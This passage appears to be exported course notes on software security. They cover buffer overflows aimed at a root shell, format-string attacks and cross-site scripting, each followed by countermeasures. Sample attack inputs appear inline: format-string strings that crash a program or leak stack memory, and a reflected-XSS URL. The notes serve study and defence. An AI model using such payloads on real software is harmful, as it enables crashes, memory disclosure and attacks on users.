href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-80df-b947-eb2dc50e2fed" class="code"><code class="language-C">void func(int a, int b){ //arguments allocated in reverse order last
		int x,y; //allocated first
		x = a + b;
		y = a - b;
		//return address and ebp alocated next
}</code></pre></div></figure><h3 id="12f1a926-7344-803c-be56-f8869ff387b0" class="">Function call chain</h3><p id="12f1a926-7344-8067-bd30-c94ece861293" class="">order of function frames being allocated in the stack is the inner most first (deeply nested) then outer most last (main function)</p><figure id="12f1a926-7344-80bc-b047-c8c488e62acf" class="image"><a href="image%2091.png"><img style="width:623.984375px" src="image%2091.png"/></a></figure></details></li></ul><ul id="12f1a926-7344-806f-bea7-cb3f471e10fe" class="toggle"><li><details><summary>Strcpy Function</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-8081-b25a-ee18d0da5b0f"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="62816b9c-3ea2-4da1-bfc0-5cbb82ba4f6a" class="">cstd function for copying string from src to dest<br/>if src is longer than dest, will cause stack overflow (unsafe)<br/></p><ul id="12f1a926-7344-800e-960e-cfae4910ad95" class="bulleted-list"><li style="list-style-type:disc">strcpy stops reading when it sees a null</li></ul><ul id="12f1a926-7344-8029-8296-dbd0fbe7da50" class="bulleted-list"><li style="list-style-type:disc">memcpy is another one</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-8049-b8f1-d8a89981af8d" class="code"><code class="language-C">char* strcpy(char* dest, const char* src) {
    char* dest_ptr = dest;

    while (*src != &#x27;\0&#x27;) {
        *dest = *src;  // Copy current character from src to dest
        src++;         // Move to the next character in src
        dest++;        // Move to the next position in dest
    }
    *dest = &#x27;\0&#x27;;      // Add the null terminator at the end of dest

    return dest_ptr;
}</code></pre></div></figure></details></li></ul><ul id="12f1a926-7344-80f7-ae52-cd39f7ebadac" class="toggle"><li><details><summary><del>Attack Example</del></summary><ul id="12f1a926-7344-80f7-babd-ff24358746e8" class="bulleted-list"><li style="list-style-type:disc">environment setup<ul id="5a1e5660-5979-47fd-acc8-7bc83be591d6" class="bulleted-list"><li style="list-style-type:circle">turn off address randomization </li></ul><ul id="80004b22-07e2-4268-866a-894d8b570810" class="bulleted-list"><li style="list-style-type:circle">compile Set-UID root version <ul id="5be04cf6-5ef3-4b03-96e6-58afeb6f3a47" class="bulleted-list"><li style="list-style-type:square">executable stack and no stack guard</li></ul></li></ul><ul id="c5dc8daa-164c-4cd6-bf37-d4cf3bb81470" class="bulleted-list"><li style="list-style-type:circle">run program and input large buffer</li></ul></li></ul><figure id="12f1a926-7344-80f6-8ea7-d96b148e4b57" class="image"><a href="image%2092.png"><img style="width:623.96875px" src="image%2092.png"/></a></figure><p id="12f1a926-7344-8003-917d-f587d3951bc6" class="">the bad file overwrites the stack</p><p id="12f1a926-7344-8072-b5fb-d886c21b7520" class="">the bigger the stack, the bigger the badfile</p><figure id="12f1a926-7344-80b3-b903-d273bcdd1a61" class="image"><a href="image%2093.png"><img style="width:623.96875px" src="image%2093.png"/></a></figure><figure id="12f1a926-7344-80d8-9b54-c3ec1c511791" class="image"><a href="image%2094.png"><img style="width:623.984375px" src="image%2094.png"/></a></figure><figure id="12f1a926-7344-8090-abcb-ec0c258941db" class="image"><a href="image%2095.png"><img style="width:2484px" src="image%2095.png"/></a></figure><figure id="12f1a926-7344-80b1-9421-da51a289f03d" class="image"><a href="image%2089.png"><img style="width:595.984375px" src="image%2089.png"/></a></figure><ul id="12f1a926-7344-80ee-976b-e8e838e4ee85" class="bulleted-list"><li style="list-style-type:disc">aim of the malicious code is to gain access to the system using a root shell<ul id="fb008428-61ba-433f-a82a-aa7edbf9df3e" class="bulleted-list"><li style="list-style-type:circle">root shell is a shell that has admin rights</li></ul><ul id="e39aef09-8817-4541-bea4-88de546bd2e6" class="bulleted-list"><li style="list-style-type:circle">allows to run commands on the system</li></ul></li></ul><figure id="12f1a926-7344-80f0-a881-caaeccda001a" class="image"><a href="image%2096.png"><img style="width:2275px" src="image%2096.png"/></a></figure><ul id="12f1a926-7344-8093-95b8-c6d6e3b97c59" class="bulleted-list"><li style="list-style-type:disc">this program in c will not work: the size of is too big</li></ul><ul id="12f1a926-7344-8069-9d3a-e44beeb26b7a" class="bulleted-list"><li style="list-style-type:disc">if your file contains 0’s then the attack will also not work because we’re using strcpy function to do this exploit (which terminates when a null terminator is found)</li></ul><ul id="12f1a926-7344-8064-b6f4-e4f75f11167a" class="bulleted-list"><li style="list-style-type:disc">the only solution to do this attack is not not use c<br/>but to write this program in x86 assembly <br/></li></ul><ul id="12f1a926-7344-80da-80f6-e66de7f9ed25" class="bulleted-list"><li style="list-style-type:disc">goal: use <code>execve(“/bin/sh”,argv,0)</code> to run shell</li></ul><figure id="12f1a926-7344-8048-b177-d27584035fa0" class="image"><a href="image%2097.png"><img style="width:624px" src="image%2097.png"/></a></figure><ul id="12f1a926-7344-8070-a9ef-fb5d19997233" class="bulleted-list"><li style="list-style-type:disc">the execuve system call’s return value and parameters can be accessed using its registors via the table (eg: eax, ebx, ecx ...)</li></ul><figure id="12f1a926-7344-8060-ab59-e6f777e31bb7" class="image"><a href="image%2098.png"><img style="width:595.96875px" src="image%2098.png"/></a></figure><figure id="12f1a926-7344-8074-b0c8-ed610cf8166b" class="image"><a href="image%2099.png"><img style="width:624px" src="image%2099.png"/></a></figure><figure id="12f1a926-7344-80d5-9f90-c9b0f65106dd" class="image"><a href="image%20100.png"><img style="width:2068px" src="image%20100.png"/></a></figure><ol type="a" id="12f1a926-7344-8014-a1a4-d6305d0b97e5" class="numbered-list" start="1"><li>how your stack will look like after the function execution </li></ol><figure id="12f1a926-7344-8022-a073-e3eb3a2a6b30" class="image"><a href="image%2090.png"><img style="width:465px" src="image%2090.png"/></a></figure></details></li></ul><h1 id="12f1a926-7344-8046-abe7-dcc86fb8e73a" class="">Countermeasures</h1><h3 id="12f1a926-7344-80cc-9a2b-d5dc775c161a" class="">Developer Approach</h3><ol type="1" id="12f1a926-7344-80af-bec1-cfbdb15e7619" class="numbered-list" start="1"><li>check length of data</li></ol><ol type="1" id="12f1a926-7344-80d5-b3b5-ce0d4eac67f8" class="numbered-list" start="2"><li>don’t let user set lengths, do it yourself <code>strncpy</code></li></ol><ol type="1" id="12f1a926-7344-80d8-95b5-d962f499b142" class="numbered-list" start="3"><li>use safter libraries</li></ol><ol type="1" id="12f1a926-7344-805f-a992-d9b30adeb766" class="numbered-list" start="4"><li>use safter languages</li></ol><h3 id="12f1a926-7344-80f8-b15a-da80d648abd2" class="">Address Space Layout Randomization (ASLR)</h3><p id="12f1a926-7344-8087-a442-e41f38817231" class="">os sets beginning of the stack &amp; heap with a random offset to reduce chance of attacker guessing addresses</p><ul id="12f1a926-7344-8058-b0cb-e6c375057a1e" class="bulleted-list"><li style="list-style-type:disc">can be defeated by turning ASLR off, compiling set UID to root or brute forcing </li></ul><figure id="12f1a926-7344-801c-8b72-e77c36176ed0" class="image"><a href="image%20101.png"><img style="width:567.953125px" src="image%20101.png"/></a></figure><h3 id="12f1a926-7344-8055-b03c-c28b1176e7f2" class="">Verify Set UID Programs</h3><p id="12f1a926-7344-80f4-b192-ce9139bd246d" class="">to prevent attacker from abusing set UID programs to gain privileges (excel) the OS checks if RUID and EUID are the same, if not downgrade EUID to RUID</p><ul id="12f1a926-7344-8036-a943-fb6b3849a56d" class="bulleted-list"><li style="list-style-type:disc">checks if you’re actually root or not</li></ul><ul id="12f1a926-7344-8058-9237-ea64096bb8eb" class="bulleted-list"><li style="list-style-type:disc">if not then de-escalate privileges </li></ul><h3 id="12f1a926-7344-808f-860b-c680ab45187f" class="">Non-executable Stack</h3><p id="12f1a926-7344-8052-96ed-dd0bee794b4c" class="">make stack frame non executable by marking them with NX bits</p><ul id="12f1a926-7344-80a8-b618-d9ca18cc604c" class="bulleted-list"><li style="list-style-type:disc">NX bit separates code from data in memory</li></ul><ul id="12f1a926-7344-80cc-ab83-e0869dd6788f" class="bulleted-list"><li style="list-style-type:disc">GCC enables this by default (can turn it off)</li></ul><ul id="12f1a926-7344-80fb-a007-ccbfdaf90e49" class="bulleted-list"><li style="list-style-type:disc">this is defeated by return to libc (return address goes to a function already loaded in memory that isn’t marked, such as c library functions) </li></ul><h3 id="12f1a926-7344-806c-9034-ea4a0547243e" class="">Stack Guard</h3><p id="12f1a926-7344-8077-870a-e2237169f3b0" class="">compiler injects secrete cannery bit into functions</p><p id="12f1a926-7344-8079-9cb5-e572d91fcbda" class="">if cannery bit is altered, buffer overflow has occurred and process is terminated  </p><figure id="12f1a926-7344-803b-ab86-c57fd9bb92dd" class="image"><a href="b385f02b-209b-4585-9d7b-a64c6f0a457c.png"><img style="width:707.0036101083032px" src="b385f02b-209b-4585-9d7b-a64c6f0a457c.png"/></a></figure></details></li></ul><ul id="12d1a926-7344-80f0-bafc-fe99f91cf463" class="toggle"><li><details><summary>Format String</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-8069-a246-fea7a3c2062e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="534b30f6-a1e8-4b70-b652-adc0f5b94d5e" class="">user inputs a format string, format specifiers are treated as trusted data, allowing attacked to execute arbitrary code or leak memory</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-8083-824e-cb6be897893a" class="code"><code class="language-C">printf(&quot;Name: %s Age: %d&quot;, user_input, age);
//user input can contain format specifiers (treated as code)</code></pre><ul id="12f1a926-7344-8059-863d-e96e796a9f78" class="bulleted-list"><li style="list-style-type:disc">if user has influence on a format string: program is vulnerable to format string attacks</li></ul><ul id="12f1a926-7344-8064-9694-cf00c572e5d4" class="bulleted-list"><li style="list-style-type:disc">format strings are vulnerable because they can contain specifiers that act like code</li></ul><ul id="12f1a926-7344-8091-8226-e7192bbe568c" class="bulleted-list"><li style="list-style-type:disc">va_list is a pointer to optional arguments in the attack<ul id="12f1a926-7344-80e5-ae64-d414ac7278cc" class="bulleted-list"><li style="list-style-type:circle">va_arg() moves to the pointer to the next argument </li></ul><ul id="12f1a926-7344-80dc-81cc-c94bd3c6d2d9" class="bulleted-list"><li style="list-style-type:circle">%d, %d, %x moves va_list by 4 bytes</li></ul></li></ul><ul id="12f1a926-7344-800e-be32-f62b8842e83a" class="bulleted-list"><li style="list-style-type:disc">format specifiers call va_args</li></ul></div></figure><ul id="12f1a926-7344-8083-8c0b-d60016a6581b" class="toggle"><li><details><summary>Printf</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-8063-bab4-f2baa2096b4a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="12f1a926-7344-8046-993e-d6e998114aa5" class="">function that accepts a format string and variadic (arbitrary amount) arguments</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-806c-a7ad-c51979d82391" class="code"><code class="language-C">
int printf(const char* format, ...);
printf(&quot;blahblah: %Access optional argumentsd, %d, %D&quot;, i, j, k);</code></pre><ul id="12f1a926-7344-80c7-8d88-dfe5bdc49319" class="bulleted-list"><li style="list-style-type:disc">arguments are typed using format specifiers<code> %…</code> in the format string</li></ul><ul id="12f1a926-7344-8007-b4cb-e277d44679e9" class="bulleted-list"><li style="list-style-type:disc">arguments are pushed into the stack in reverse order</li></ul><ul id="12f1a926-7344-80a7-939a-c666af23af61" class="bulleted-list"><li style="list-style-type:disc">if incorrect number of arguments are given while format string still contains format specifiers: <code>va_args </code>will till continue to increment <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-8085-9870-c6ebd308182a" class="code"><code class="language-C">int x = 10;
int y = 12
printf(&quot;%d %d %d&quot;, x,y ); //mismatch: va_args still increments</code></pre><ul id="12f1a926-7344-8086-afa6-dfd97d113272" class="bulleted-list"><li style="list-style-type:circle">this allows attackers to print/access contents of memory</li></ul></li></ul></div></figure><h3 id="12f1a926-7344-80ec-a5aa-e53dbab71877" class="">Access optional arguments</h3><ul id="12f1a926-7344-8001-b4e1-dd31d428c9fe" class="bulleted-list"><li style="list-style-type:disc"><code>va_list </code>pointer to the current argument in the stack</li></ul><ul id="12f1a926-7344-803e-a4c4-d6204445f08d" class="bulleted-list"><li style="list-style-type:disc"><code>va_arg </code>function increments to the next argument</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-8000-a3cd-db1980ff6b73" class="code"><code class="language-C">int myprint(int numArg, ...){
		int i;
		va_list ap;
		
		va_start(ap, numArg);
		for(i = 0 ; i &lt; numArg ; i++){
				printf(&quot;%d &quot;, va_arg(ap, int));
				printf(&quot;%f\n &quot;, va_arg(ap, double));
		}
		va_end(ap);
}

myprint(1, 2, 3.5);</code></pre></details></li></ul><ul id="12f1a926-7344-803f-947a-e95959abbfd2" class="toggle"><li><details><summary>Format Specifiers </summary><h3 id="12f1a926-7344-8013-999c-cc30c5f886f9" class="">Format Specifiers</h3><table id="12f1a926-7344-809f-b01f-cafab1eeaedd" class="simple-table"><tbody><tr id="1eb2bc87-743a-44e7-bf40-468918713230"><td id="ULRD" class="">specifier</td><td id="nKCE" class="">meaning</td><td id="yJwu" class="">passed as</td><td id="pF]e" class="">eg</td></tr><tr id="24cc1571-73f5-4f7d-a463-f77d8db2a560"><td id="ULRD" class="">%d</td><td id="nKCE" class="">int</td><td id="yJwu" class="">value</td><td id="pF]e" class="">10</td></tr><tr id="b2fcd92f-1712-4265-aff9-63b330252c4c"><td id="ULRD" class="">%u</td><td id="nKCE" class="">unsigned int</td><td id="yJwu" class="">value</td><td id="pF]e" class="">10</td></tr><tr id="12f1a926-7344-8002-b187-d26eb9e96070"><td id="ULRD" class="">%x</td><td id="nKCE" class="">hexadecimal</td><td id="yJwu" class="">value</td><td id="pF]e" class="">7fa</td></tr><tr id="12f1a926-7344-801c-8817-fecd76ff8a0f"><td id="ULRD" class="">%s</td><td id="nKCE" class="">string</td><td id="yJwu" class="">reference</td><td id="pF]e" class="">Sample</td></tr><tr id="12f1a926-7344-80e8-beba-f310fd13396b"><td id="ULRD" class="">%n</td><td id="nKCE" class="">number of bytes written so far</td><td id="yJwu" class="">reference</td><td id="pF]e" class=""></td></tr><tr id="12f1a926-7344-8074-b712-deb4c5d20194"><td id="ULRD" class="">%.5d</td><td id="nKCE" class="">fills with 0s</td><td id="yJwu" class=""></td><td id="pF]e" class="">10 = 00010</td></tr><tr id="12f1a926-7344-80f5-8f11-ebb5127c3782"><td id="ULRD" class="">%5d</td><td id="nKCE" class="">fills with spaces</td><td id="yJwu" class=""></td><td id="pF]e" class="">10 =    10</td></tr></tbody></table><h3 id="12f1a926-7344-80b3-90f2-f91efbe05ed3" class="">Precision &amp; Width modifier</h3><figure id="12f1a926-7344-80c8-9513-e40615c71144" class="image"><a href="8612add4-e57d-47f8-b01b-bcf52181b416.png"><img style="width:708px" src="8612add4-e57d-47f8-b01b-bcf52181b416.png"/></a></figure><h3 id="12f1a926-7344-809e-b3c2-cc928a348cb2" class="">Length modifier for %n</h3><figure id="12f1a926-7344-8070-99b6-cb196d7f8b4a" class="image"><a href="63004791-6996-4155-a451-b5ed8212375c.png"><img style="width:632.923832923833px" src="63004791-6996-4155-a451-b5ed8212375c.png"/></a></figure><p id="12f1a926-7344-80fe-a762-fe34b2a8bf6b" class="">
</p></details></li></ul><ul id="12f1a926-7344-805c-b4a2-c5445333ec97" class="toggle"><li><details><summary>Attack Examples</summary><h3 id="12f1a926-7344-80e8-b716-f693809d9126" class="">Crash Program</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-80db-b79f-dba784082f6d" class="code"><code class="language-C">Please enter a String: %s%s%s%s%s%s%s
Segmentation fault (core dump)</code></pre><figure id="12f1a926-7344-8080-9390-ce89b0c12a8b" class="image"><a href="image%20102.png"><img style="width:624px" src="image%20102.png"/></a></figure><h3 id="12f1a926-7344-80a8-9f37-e02d593dfd04" class="">Print out data from the Stack</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-8073-94bd-c5fb7af1dfec" class="code"><code class="language-C">Please enter a String: %x.%x.%x.%x.%x.%x.
63.b7fc5ac0.b7eb863d.bffff3fff.11223344.252a9904.</code></pre><figure id="12f1a926-7344-8006-bfca-c8859e537dc3" class="image"><a href="image%20103.png"><img style="width:624px" src="image%20103.png"/></a></figure><h3 id="12f1a926-7344-809c-8279-fe499889fec2" class="">Print out secret value on the stack</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-80df-a327-db038c7a3363" class="code"><code class="language-C">//if the distance between secret value and stack is 20 bytes
//we know each increment of va_List will be 4
20/4=5
//so we need 6 %x specifiers to print the secret
//5 to get to the secret, one more to print it
Please enter a String: %x.%x.%x.%x.%x</code></pre><figure id="12f1a926-7344-80cc-8721-c27d3d1b8b49" class="image"><a href="image%20104.png"><img style="width:2527px" src="image%20104.png"/></a></figure><h3 id="12f1a926-7344-8008-8dec-e8e8b14f1d6e" class="">Print out data not in the stack</h3><figure id="12f1a926-7344-804e-97aa-e8e17b1ab594" class="image"><a href="image%20105.png"><img style="width:624px" src="image%20105.png"/></a></figure><h3 id="12f1a926-7344-8003-9eeb-d66d812e4ac7" class="">Print out data at a specific address</h3><ul id="12f1a926-7344-8029-b11c-f95406c7518c" class="bulleted-list"><li style="list-style-type:disc">set a variable of the specific address</li></ul><figure id="12f1a926-7344-809e-b1a4-ff599f7e6897" class="image"><a href="image%20106.png"><img style="width:2466px" src="image%20106.png"/></a></figure><ul id="12f1a926-7344-80a2-a11a-c65b607e7467" class="bulleted-list"><li style="list-style-type:disc">we can do this with %n</li></ul><figure id="12f1a926-7344-8067-abfc-c2d2525388c7" class="image"><a href="image%20107.png"><img style="width:2468px" src="image%20107.png"/></a></figure><h3 id="12f1a926-7344-80a6-9588-c17537ac46e1" class="">Change Program’s data in memory</h3><figure id="12f1a926-7344-8048-afd9-c03d9e266f51" class="image"><a href="image%20108.png"><img style="width:2459px" src="image%20108.png"/></a></figure><figure id="12f1a926-7344-80ae-9d19-eccec4015494" class="image"><a href="image%20109.png"><img style="width:624px" src="image%20109.png"/></a></figure><h3 id="12f1a926-7344-80e9-ae0a-f8f603431fa6" class="">Change program’s data to a specific value</h3><figure id="12f1a926-7344-8018-898d-effb863d8c44" class="image"><a href="image%20110.png"><img style="width:624px" src="image%20110.png"/></a></figure><ul id="12f1a926-7344-8098-9c24-d075fb70c939" class="bulleted-list"><li style="list-style-type:disc">split the address we want to insert our data in into 2 parts</li></ul><ul id="12f1a926-7344-802b-ab57-f3a5b7ade2e4" class="bulleted-list"><li style="list-style-type:disc">write 2 bytes at a time</li></ul><figure id="12f1a926-7344-80ac-b9f0-f20b622e38f3" class="image"><a href="image%20111.png"><img style="width:2491px" src="image%20111.png"/></a></figure><figure id="12f1a926-7344-80e0-b3f0-d7e39e39c572" class="image"><a href="image%20112.png"><img style="width:2468px" src="image%20112.png"/></a></figure><h3 id="12f1a926-7344-80dc-9d08-e67ca3c87879" class="">Inject Malicious Code</h3><figure id="12f1a926-7344-80e2-91ba-eea294d1b099" class="image"><a href="image%20113.png"><img style="width:596px" src="image%20113.png"/></a></figure><figure id="12f1a926-7344-8044-9dc3-d2ee33e90fdd" class="image"><a href="image%20114.png"><img style="width:596px" src="image%20114.png"/></a></figure><figure id="12f1a926-7344-807b-8342-fa2292f37f2c" class="image"><a href="image%20115.png"><img style="width:596px" src="image%20115.png"/></a></figure></details></li></ul><h1 id="12f1a926-7344-800e-8f32-fbc099290876" class="">Countermeasures</h1><h3 id="12f1a926-7344-8058-9a88-f1f906222cab" class="">Developer Approach</h3><ul id="12f1a926-7344-80cc-bd4a-e3eb353cc1b0" class="bulleted-list"><li style="list-style-type:disc">avoid trusting inputs for format strings</li></ul><ul id="12f1a926-7344-8052-9b56-e46e41fa0c74" class="bulleted-list"><li style="list-style-type:disc">never let user able to use format strings</li></ul><h3 id="12f1a926-7344-800d-adfb-f586fe748d25" class="">Compiler Approach</h3><p id="12f1a926-7344-8098-a470-ecf675be19be" class="">compilers can give warnings for incorrect format string specifiers</p><p id="12f1a926-7344-8089-877b-d92a855d8956" class="">use 2 compilers (gcc and clang) and see if there is a mismatch in the format string</p><h3 id="12f1a926-7344-80b3-9f52-daabddebd47b" class="">Other Approaches</h3><ul id="12f1a926-7344-8022-b685-cb652a761590" class="bulleted-list"><li style="list-style-type:disc">address randomization makes it harder for attackers to guess address of target memory</li></ul><ul id="12f1a926-7344-800b-bb08-f209c567aae6" class="bulleted-list"><li style="list-style-type:disc">non executable stack doesn’t work because return to lib c</li></ul><ul id="12f1a926-7344-804b-b83b-e1b3a42e76d2" class="bulleted-list"><li style="list-style-type:disc">stack guard doesn’t work because format string can specify which memory to target (without affecting the rest)</li></ul></details></li></ul><ul id="12d1a926-7344-8034-946b-ce09a034cad5" class="toggle"><li><details><summary>Cross-site Scripting (XSS)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-80ca-a27b-d509408db6af"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="afbf004b-045c-4e11-b747-770ec1296368" class="">attacker uses vulnerable website as a delivery mechanism to <mark class="highlight-yellow"><mark class="highlight-default_background">execute malicious code in a user’s browser</mark></mark></p><figure id="12f1a926-7344-800c-832e-fcd212c136d4" class="image" style="text-align:center"><a href="image%20116.png"><img style="width:624px" src="image%20116.png"/></a></figure><figure id="1301a926-7344-80ef-ace8-da71306de057" class="image"><a href="image%20117.png"><img style="width:509px" src="image%20117.png"/></a></figure><ul id="12f1a926-7344-80a4-91d4-fa4d77e41119" class="bulleted-list"><li style="list-style-type:disc">reflected XSS takes input and reflects it back to the user<p id="12f1a926-7344-80cf-a64e-c49ed69dcee0" class="">eg: attacker sends URL to victim <code>http://www.example.com/search?input=&lt;script&gt;alert(“attack”);&lt;/script&gt;</code></p></li></ul><ul id="12f1a926-7344-8096-95f0-d683f472d905" class="bulleted-list"><li style="list-style-type:disc">stored XXS stores attack code on target website<p id="12f1a926-7344-8050-87fc-fbd309a1052b" class="">eg: user visits profile and stored js is executed</p></li></ul><ul id="12f1a926-7344-805f-a18a-fa9649d8595a" class="bulleted-list"><li style="list-style-type:disc">XSS can deface websites using the DOM, spoof HTTPS requests on behalf of the victim and steal information (cookies, personal data, data stored locally)</li></ul></div></figure><ul id="12f1a926-7344-8077-8818-ce6d3b9e1625" class="toggle"><li><details><summary>Self Propagating XSS Worm</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1301a926-7344-8063-bd1d-d73e542017a7"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="7961f660-5a2e-44e2-be23-227e0b211486" class="">XSS attack that infects victims to spread further and attack more users</p><ul id="1301a926-7344-8005-9557-fd4a6ab3149b" class="bulleted-list"><li style="list-style-type:disc">Samy&#x27;s worm: visitors of his profile will be attacked and their profiles can also be made to carry a copy of Samy’s JS code </li></ul><figure id="1301a926-7344-80df-b468-d040d5fde21f" class="image"><a href="image%20118.png"><img style="width:561.984375px" src="image%20118.png"/></a></figure></div></figure><p id="1301a926-7344-804b-b6cd-d788e4cfeb64" class="">two ways for java script code to produce a copy of itself</p><h3 id="1301a926-7344-8083-b7c6-fce52ba501f2" class="">DOM (Domain Object Model) Approach</h3><ul id="1301a926-7344-80e2-a149-e40aee462d3c" class="bulleted-list"><li style="list-style-type:disc">DOM contains the content of the page tree. </li></ul><ul id="1301a926-7344-80a8-b43b-e60a62b43661" class="bulleted-list"><li style="list-style-type:disc">you can use DOM APIs to access elements of the tree</li></ul><ul id="1301a926-7344-80bc-a99e-dbfe77fd87f8" class="bulleted-list"><li style="list-style-type:disc"><code>document.getElementByID()</code> can be used to get the JS attack code from a script tag<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 